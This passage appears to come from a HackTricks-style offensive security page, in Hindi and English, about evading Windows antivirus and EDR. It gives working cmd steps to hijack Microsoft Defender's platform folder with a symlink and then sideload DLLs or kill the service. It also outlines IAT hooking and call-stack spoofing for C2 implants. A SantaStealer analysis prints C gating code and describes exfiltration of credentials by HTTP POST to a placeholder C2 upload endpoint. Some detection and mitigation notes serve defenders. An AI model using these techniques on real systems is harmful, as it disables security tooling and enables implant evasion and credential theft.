- WDAC/Code Integrity: सीमित करें कि कौन से signed binaries PPL के रूप में और किन parents के तहत चल सकते हैं; legitimate contexts के बाहर ClipUp invocation को ब्लॉक करें।
- Service hygiene: auto-start services की creation/modification को सीमित करें और start-order manipulation की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections सक्षम हैं; binary corruption सूचित करने वाली startup errors की जाँच करें।
- यदि आपकी environment के अनुकूल हो तो security tooling होस्ट करने वाले वॉल्यूम्स पर 8.3 short-name generation को अक्षम करने पर विचार करें (पूरी तरह परीक्षण करें)।

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack के माध्यम से Microsoft Defender में छेड़छाड़

Windows Defender उस platform का चयन उन सबफ़ोल्डरों को enumerate करके करता है जो इस पथ के अंदर हैं:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह lexicographic रूप से सबसे उच्च version string वाले subfolder को चुनता है (उदा., `4.18.25070.5-0`), फिर वहां से Defender service processes को शुरू करता है (अनुरूप service/registry paths को अपडेट करते हुए)। यह चयन directory entries पर भरोसा करता है जिनमें directory reparse points (symlinks) शामिल हैं। एक administrator इसका लाभ उठाकर Defender को attacker-writable path पर redirect कर सकता है और DLL sideloading या service disruption प्राप्त कर सकता है।

Preconditions
- Local Administrator (Platform फ़ोल्डर के अंतर्गत directories/symlinks बनाने के लिए आवश्यक)
- Reboot करने या Defender platform re-selection ट्रिगर करने की क्षमता (boot पर service restart)
- केवल built-in tools आवश्यक (mklink)

Why it works
- Defender अपनी ही फ़ोल्डरों में लिखने को रोकता है, लेकिन उसका platform चयन directory entries पर भरोसा करता है और lexicographically सबसे उच्च version चुन लेता है बिना यह सत्यापित किए कि लक्ष्य एक protected/trusted path पर resolve होता है।

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) अपनी फ़ोल्डर की ओर इशारा करते हुए Platform के अंदर एक higher-version directory symlink बनाएं:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) ट्रिगर चयन (रिबूट की सिफारिश):
```cmd
shutdown /r /t 0
```
4) सत्यापित करें कि MsMpEng.exe (WinDefend) पुनर्निर्देशित पथ से चल रहा है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के तहत नया process path और service configuration/registry को उस लोकेशन का प्रतिबिंब दिखता हुआ देखना चाहिए।

Post-exploitation options
- DLL sideloading/code execution: Defender अपने application directory से जो DLLs लोड करता है उन्हें drop/replace करके Defender के processes में code execute कराएँ। ऊपर के सेक्शन को देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink को हटाएँ ताकि अगले start पर configured path resolve न हो और Defender start होने में विफल रहे:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> ध्यान दें कि यह तकनीक खुद privilege escalation प्रदान नहीं करती; यह admin rights की आवश्यकता रखती है।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से निकालकर target module के अंदर शिफ्ट कर सकते हैं by hooking its Import Address Table (IAT) और selected APIs को attacker-controlled, position‑independent code (PIC) के through route करके। यह evasion को सामान्य करता है beyond the small API surface many kits expose (e.g., CreateProcessA), और उसी protections को BOFs और post‑exploitation DLLs तक विस्तारित करता है।

High-level approach
- Target module के साथ एक PIC blob को reflective loader (prepended or companion) का उपयोग करके stage करें। PIC self‑contained और position‑independent होना चाहिए।
- जब host DLL लोड होता है, तो उसकी IMAGE_IMPORT_DESCRIPTOR को traverse करके targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) के लिए IAT entries को thin PIC wrappers की ओर point करने के लिए patch करें।
- प्रत्येक PIC wrapper वास्तविक API address को tail‑call करने से पहले evasions निष्पादित करता है। सामान्य evasions में शामिल हैं:
  - कॉल के चारों ओर memory mask/unmask (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) और फिर post‑call restore।
  - Call‑stack spoofing: एक benign stack बनाकर target API में transition करें ताकि call‑stack analysis अपेक्षित frames को resolve करे।
- Compatibility के लिए, एक interface export करें ताकि एक Aggressor script (या समकक्ष) यह register कर सके कि Beacon, BOFs और post‑ex DLLs के लिए किन APIs को hook करना है।

Why IAT hooking here
- यह किसी भी code के लिए काम करता है जो hooked import का उपयोग करता है, बिना tool code modify किए या Beacon पर specific APIs को proxy करने पर निर्भर हुए।
- post‑ex DLLs को कवर करता है: LoadLibrary* को hook करने से आप module loads (e.g., System.Management.Automation.dll, clr.dll) को intercept कर सकते हैं और उनकी API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके यह call‑stack–based detections के खिलाफ process‑spawning वाले post‑ex commands के विश्वसनीय उपयोग को बहाल करता है।

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- पैच को relocations/ASLR के बाद और import के प्रथम उपयोग से पहले लागू करें। Reflective loaders जैसे TitanLdr/AceLdr लोड किए गए मॉड्यूल के DllMain के दौरान hooking दिखाते हैं।
- wrappers को छोटा और PIC-safe रखें; वास्तविक API को उन original IAT values के माध्यम से resolve करें जिन्हें आपने patching से पहले capture किया था, या LdrGetProcedureAddress का उपयोग करें।
- PIC के लिए RW → RX transitions का उपयोग करें और writable+executable पेज न छोड़ें।

Call‑stack spoofing stub
- Draugr‑style PIC stubs एक fake call chain बनाते हैं (return addresses benign modules की ओर) और फिर वास्तविक API में pivot करते हैं।
- यह उन detections को विफल करता है जो Beacon/BOFs से sensitive APIs तक canonical stacks की उम्मीद करते हैं।
- stack cutting/stack stitching तकनीकों के साथ जोड़ें ताकि API prologue से पहले expected frames के भीतर पहुंचा जा सके।

Operational integration
- Reflective loader को post‑ex DLLs के आगे prepend करें ताकि PIC और hooks तब स्वतः initialise हो जाएँ जब DLL लोड हो।
- target APIs को register करने के लिए Aggressor script का उपयोग करें ताकि Beacon और BOFs बिना code बदलाव के उसी evasion path से पारदर्शी लाभ प्राप्त कर सकें।

Detection/DFIR considerations
- IAT integrity: ऐसे entries जो non‑image (heap/anon) addresses पर resolve होते हैं; import pointers का periodic verification।
- Stack anomalies: return addresses जो loaded images से संबंधित नहीं हैं; non‑image PIC पर abrupt transitions; inconsistent RtlUserThreadStart ancestry।
- Loader telemetry: IAT में in‑process writes, early DllMain गतिविधि जो import thunks को modify करती है, load पर बनाए गए unexpected RX regions।
- Image‑load evasion: यदि LoadLibrary* को hook किया जा रहा है, तो memory masking events से correlated suspicious loads of automation/clr assemblies को monitor करें।

Related building blocks and examples
- Reflective loaders जो load के दौरान IAT patching करते हैं (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) और stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) यह दिखाता है कि आधुनिक info-stealers कैसे AV bypass, anti-analysis और credential access को एक ही workflow में मिला देते हैं।

### Keyboard layout gating & sandbox delay

- एक config flag (`anti_cis`) `GetKeyboardLayoutList` के माध्यम से इंस्टॉल किए गए keyboard layouts को enumerate करता है। यदि कोई Cyrillic layout मिलता है, तो sample एक खाली `CIS` marker छोड़ता है और stealers चलाने से पहले terminate कर देता है, जिससे यह सुनिश्चित होता है कि यह excluded locales पर कभी नहीं detonates जबकि एक hunting artifact छोड़ दिया जाता है।
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### परतदार `check_antivm` लॉजिक

- Variant A process सूची को स्कैन करता है, प्रत्येक नाम का हैश एक कस्टम rolling checksum से बनाता है और उसे embedded blocklists (debuggers/sandboxes) के खिलाफ तुलना करता है; यह checksum कंप्यूटर नाम पर भी दोहराता है और `C:\analysis` जैसे working directories की जाँच करता है।
- Variant B system properties (process-count floor, recent uptime) की जांच करता है, VirtualBox additions का पता लगाने के लिए `OpenServiceA("VBoxGuest")` को कॉल करता है, और single-stepping पकड़ने के लिए sleeps के आसपास timing checks करता है। कोई भी मैच होने पर modules लॉन्च होने से पहले abort कर दिया जाता है।

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` एक global `memory_generators` function-pointer table पर iterate करता है और हर enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.) के लिए एक thread spawn करता है। प्रत्येक thread results को shared buffers में लिखता है और ~45s की join window के बाद अपनी file count report करता है।
- Once finished, everything is zipped with the statically linked `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` then sleeps 15s and streams the archive in 10 MB chunks via HTTP POST to `http://<C2>:6767/upload`, spoofing a browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Each chunk adds `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, and the last chunk appends `complete: true` so the C2 knows reassembly is done.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
